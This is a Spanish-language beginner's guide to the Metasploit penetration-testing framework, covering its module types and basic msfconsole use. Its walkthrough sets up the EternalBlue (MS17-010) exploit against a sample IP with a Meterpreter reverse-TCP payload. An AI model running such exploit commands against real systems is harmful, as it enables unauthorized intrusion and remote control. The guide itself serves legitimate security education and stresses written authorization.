
# Metasploit Framework

## ¿Qué es Metasploit Framework?

Metasploit Framework es una de las plataformas de pruebas de penetración (pentesting) más populares y potentes del mundo. Es un proyecto de código abierto, escrito principalmente en Ruby, que proporciona a los profesionales de la ciberseguridad un conjunto de herramientas para desarrollar, probar y ejecutar exploits contra sistemas vulnerables.

Funciona como un ecosistema modular que incluye exploits, payloads, herramientas auxiliares y de post-explotación, permitiendo un ciclo completo de pruebas de penetración, desde el descubrimiento de vulnerabilidades hasta la post-explotación.

## ¿Para qué es útil la herramienta?

Metasploit Framework es una herramienta indispensable para pentesters, hackers éticos, investigadores de seguridad y administradores de sistemas. Sus principales usos son:

-   **Pruebas de Penetración:** Su objetivo principal es ayudar a los profesionales a evaluar la seguridad de sistemas y redes simulando ataques reales.
-   **Análisis de Vulnerabilidades:** Permite identificar y verificar la existencia de vulnerabilidades en sistemas operativos, aplicaciones y servicios.
-   **Desarrollo de Exploits:** Proporciona un entorno para crear y probar exploits personalizados.
-   **Post-Explotación:** Una vez que un sistema ha sido comprometido, Metasploit ofrece módulos para escalar privilegios, pivotar a otras máquinas, recopilar información y mantener el acceso.
-   **Educación y Entrenamiento:** Es una herramienta fundamental para enseñar y aprender sobre técnicas de ataque, defensa y análisis de vulnerabilidades.

## Componentes Clave

Metasploit se organiza en diferentes tipos de módulos:

-   **Exploits:** Código que se aprovecha de una vulnerabilidad específica en un sistema o aplicación para obtener acceso.
-   **Payloads:** Son el código que se ejecuta en el sistema objetivo una vez que el exploit ha tenido éxito. Los payloads pueden abrir una shell de comandos, establecer una sesión Meterpreter (una shell avanzada), o realizar otras acciones maliciosas.
-   **Auxiliary (Auxiliares):** Módulos que no ejecutan un payload directamente, pero realizan tareas útiles como escaneo de puertos, enumeración de servicios, fuzzing o administración.
-   **Post-Explotation:** Módulos que se utilizan después de haber obtenido acceso a un sistema, para escalar privilegios, recopilar información, tomar capturas de pantalla, etc.
-   **Encoders (Codificadores):** Utilizados para codificar payloads y evitar la detección por parte de sistemas de seguridad.
-   **Nops (No Operation):** Pequeñas secuencias de código que no hacen nada, utilizadas para rellenar espacios y asegurar que el payload se ejecute correctamente.

## ¿Cómo se usa?

El Metasploit Framework se interactúa principalmente a través de su interfaz de línea de comandos, `msfconsole`.

### 1. Instalación

Metasploit viene preinstalado en distribuciones como Kali Linux. En otros sistemas operativos (Windows, macOS), se puede descargar e instalar desde el sitio web oficial de Rapid7.

```bash
# En Kali Linux, simplemente inicia:
msfconsole
```

### 2. Uso Básico (msfconsole)

1.  **Iniciar `msfconsole`:**
    ```bash
    msfconsole
    ```
    Esto abrirá la consola interactiva de Metasploit.

2.  **Buscar Módulos:**
    Utiliza el comando `search` para encontrar exploits o auxiliares.

    ```bash
    search ms17-010     # Busca exploits relacionados con MS17-010 (EternalBlue)
    search scanner/ftp  # Busca módulos auxiliares para escanear FTP
    ```

3.  **Seleccionar un Módulo:**
    Una vez que encuentres un módulo, usa `use` seguido de su ruta completa.

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

4.  **Mostrar y Configurar Opciones:**
    Después de seleccionar un módulo, usa `show options` para ver los parámetros que puedes configurar.

    ```bash
    show options
    ```
    Luego, usa `set` para asignar valores a los parámetros.

    ```bash
    set RHOSTS 192.168.1.100       # Establece la IP del objetivo remoto
    set LHOST 192.168.1.5          # Establece la IP de tu máquina local
    set LPORT 4444                 # Establece el puerto de escucha local
    ```

5.  **Seleccionar un Payload (si es un exploit):**
    Si estás usando un exploit, puede que necesites seleccionar un payload. Usa `show payloads` para ver las opciones y `set payload` para elegir uno.

    ```bash
    show payloads
    set payload windows/meterpreter/reverse_tcp
    ```

6.  **Ejecutar el Ataque:**
    Una vez que todas las opciones estén configuradas, ejecuta el módulo.

    ```bash
    run
    # o
    exploit
    ```

7.  **Sesiones (Sessions):**
    Si el exploit es exitoso, se abrirá una "sesión" (por ejemplo, una sesión Meterpreter) que te permitirá interactuar con el sistema objetivo. Puedes listar las sesiones con `sessions -l` e interactuar con ellas usando `sessions -i <ID_sesion>`.

## Otras Consideraciones

-   **Ética y Legalidad:** Metasploit Framework es una herramienta ofensiva extremadamente potente. Su uso debe ser **estrictamente ético y legal**, siempre con el permiso explícito y por escrito del propietario del sistema objetivo. El uso no autorizado es ilegal y puede tener graves consecuencias.
-   **Actualizaciones:** Debido a la constante aparición de nuevas vulnerabilidades, es crucial mantener Metasploit Framework actualizado para asegurar su efectividad.
-   **Recursos del Sistema:** Metasploit puede consumir una cantidad considerable de recursos del sistema, especialmente durante ataques complejos.
